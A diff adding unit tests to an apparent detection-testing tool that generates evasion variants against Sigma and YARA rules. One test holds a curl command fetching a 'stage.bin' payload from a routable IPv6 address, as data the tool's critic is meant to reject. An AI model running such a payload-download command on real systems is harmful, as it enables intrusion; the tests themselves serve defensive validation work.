@@ -111,6 +111,41 @@ class SwarmCriticTests(unittest.TestCase):
         verdict = self.critic.evaluate(variant)
         self.assertTrue(verdict.passed, f"Safe variant rejected: {verdict.reason}")
 
+    def test_critic_rejects_routable_ipv6_literal(self):
+        variant = Variant(
+            id="test-5",
+            target_type="sigma",
+            axis="lolbin",
+            mutation_name="bad_ipv6",
+            description="Testing routable IPv6 literal rejection outside URL context",
+            payload={
+                "ParentImage": "C:\\Windows\\explorer.exe",
+                "Image": "C:\\Windows\\System32\\curl.exe",
+                "CommandLine": "curl.exe -g -6 [2001:4860:4860::8888]/stage.bin",
+            },
+            cycle=1,
+        )
+        verdict = self.critic.evaluate(variant)
+        self.assertFalse(verdict.passed)
+        self.assertIn("Routable IPv6", verdict.reason)
+
+    def test_critic_allows_loopback_and_link_local_ipv6(self):
+        variant = Variant(
+            id="test-6",
+            target_type="sigma",
+            axis="lolbin",
+            mutation_name="safe_ipv6",
+            description="Loopback and link-local IPv6 remain permitted",
+            payload={
+                "ParentImage": "C:\\Windows\\explorer.exe",
+                "Image": "C:\\Windows\\System32\\curl.exe",
+                "CommandLine": "curl.exe -g -6 [::1]:8080/health fe80::1",
+            },
+            cycle=1,
+        )
+        verdict = self.critic.evaluate(variant)
+        self.assertTrue(verdict.passed, f"Safe IPv6 variant rejected: {verdict.reason}")
+
 
 class SwarmCraftsmanTests(unittest.TestCase):
     """Verifies that Craftsmen generate variants across requested cycles."""
@@ -155,6 +190,10 @@ class SwarmDetectorTests(unittest.TestCase):
         result = detector.evaluate(variant)
         self.assertTrue(result.detected)
 
+    def test_yara_detector_resolves_single_rule_name(self):
+        detector = YaraDetector()
+        self.assertEqual(detector.target_rule_name, "Suspicious_Active_Content_SVG_Attachment")
+
     def test_sigma_detector_execution(self):
         detector = SigmaDetector()
         variant = Variant(
@@ -191,6 +230,11 @@ class SwarmOrchestratorEndToEndTests(unittest.TestCase):
         self.assertGreater(boundary_map.total_generated, 0)
         self.assertGreater(boundary_map.critic_approved, 0)
         self.assertGreater(len(results), 0)
+
+        # The boundary map must name the rule it probed instead of nulling it out.
+        self.assertEqual(boundary_map.target_rule, "Suspicious_Active_Content_SVG_Attachment")
+        for finding in boundary_map.findings:
+            self.assertEqual(finding.target_rule, "Suspicious_Active_Content_SVG_Attachment")
 
     def test_sigma_orchestrator_run(self):
         directive = OperatorDirective(
@@ -796,6 +840,26 @@ class StrategicSynthesizerTests(unittest.TestCase):
 
         self.assertEqual(stats["sources_excluded"], 0)
         self.assertEqual(stats["total_evaluations"], 12)
+
+    def test_empty_basis_refuses_synthesis(self):
+        """Zero observations must refuse synthesis instead of fabricating a figure."""
+        from tools.swarm.synthesizer import StrategicSynthesizer
+
+        with tempfile.TemporaryDirectory() as cables, tempfile.TemporaryDirectory() as results:
+            results_dir = Path(results)
+            (results_dir / "boundary_history_sigma.json").write_text(
+                json.dumps({"total_generated": 0, "evaded_count": 0}),
+                encoding="utf-8",
+                newline="\n",
+            )
+            (results_dir / "boundary_history_yara.json").write_text(
+                json.dumps({"total_generated": 0, "evaded_count": 0}),
+                encoding="utf-8",
+                newline="\n",
+            )
+            synthesizer = StrategicSynthesizer(cables_dir=Path(cables), results_dir=results_dir)
+            with self.assertRaises(ValueError):
+                synthesizer.synthesize()
 
 
 class TelemetryGeneratorTests(unittest.TestCase):
@@ -1645,6 +1709,36 @@ class WorkbenchCanvasTests(unittest.TestCase):
     def test_reports_all_three_live_metrics(self):
         for label in ("Depth of Defense", "Mean Time to Detect", "Path to Objective"):
             self.assertIn(label, self.html)
+
+    def test_no_premature_script_tag_closure(self):
+        """Ensures inline string literals do not contain unescaped </script>, which breaks HTML parsing."""
+        from html.parser import HTMLParser
+
+        class ScriptBoundaryTracker(HTMLParser):
+            def __init__(self):
+                super().__init__()
+                self.script_depth = 0
+                self.leaked_tokens = []
+
+            def handle_starttag(self, tag, attrs):
+                if tag == "script":
+                    self.script_depth += 1
+
+            def handle_endtag(self, tag):
+                if tag == "script":
+                    self.script_depth -= 1
+
+            def handle_data(self, data):
+                if self.script_depth == 0 and ("execution:" in data or "CAMP-CLICKFIX-001" in data):
+                    self.leaked_tokens.append(data.strip()[:60])
+
+        tracker = ScriptBoundaryTracker()
+        tracker.feed(self.html)
+        self.assertEqual(
+            tracker.leaked_tokens,
+            [],
+            f"JavaScript leaked outside <script> block due to unescaped tag: {tracker.leaked_tokens}",
+        )
 
 
 if __name__ == "__main__":
